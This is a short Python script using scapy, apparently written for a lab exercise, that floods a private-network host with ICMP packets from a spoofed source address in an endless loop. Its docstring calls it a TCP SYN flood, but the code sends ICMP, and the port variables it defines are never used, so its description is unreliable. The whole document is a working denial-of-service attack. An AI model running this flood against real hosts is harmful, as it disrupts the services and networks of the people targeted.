"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : SYN attack, similar to ICMP flood - flood the server with TCP syn request (to receive acks)
"""
from scapy.all import *
import sys


IP_source = "192.168.1.111"
IP_dest = "192.168.1.103"
C = RandShort() # source port
D = 9999 # destination port

#Send ICMP packet
while True:
    send(IP(src=IP_source, dst=IP_dest) / ICMP(), iface="enp0s3")